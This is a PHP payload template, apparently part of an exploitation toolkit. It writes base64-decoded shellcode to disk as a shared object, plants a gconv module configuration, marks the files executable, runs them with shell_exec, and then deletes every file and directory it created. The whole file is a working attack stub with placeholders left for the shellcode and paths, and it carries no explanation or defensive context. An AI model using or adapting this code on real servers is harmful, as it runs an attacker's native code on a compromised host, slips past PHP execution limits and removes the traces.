<?php
class Run
{
    private $dirs = array('@GCONV_DIR@', '@SO_DIR@');
    private $files = array(
        array('name' => '@SO_PATH@', 'content' => ''),
        array('name' => '@GCONV_DIR@/@SO_NAME@', 'content' => ''),
        array('name' => '@GCONV_MOD_PATH@', 'content' => '@GCONV_MOD_CONTENT@'),
    );

    public function __construct()
    {
        foreach ($this->dirs as $d) {
            if (!is_dir($d))
                mkdir($d, 0755, true);
        }
        $this->files[0]['content'] = base64_decode('@SHELLCODE@', false);
        foreach ($this->files as $f) {
            file_put_contents($f['name'], $f['content']);
            chmod($f['name'], 0755);
        }
        shell_exec('./@SO_PATH@');
    }

    public function __destruct()
    {
        foreach ($this->files as $f)
            unlink($f['name']);
        foreach ($this->dirs as $d)
            rmdir($d);
    }
};
new Run();
?>
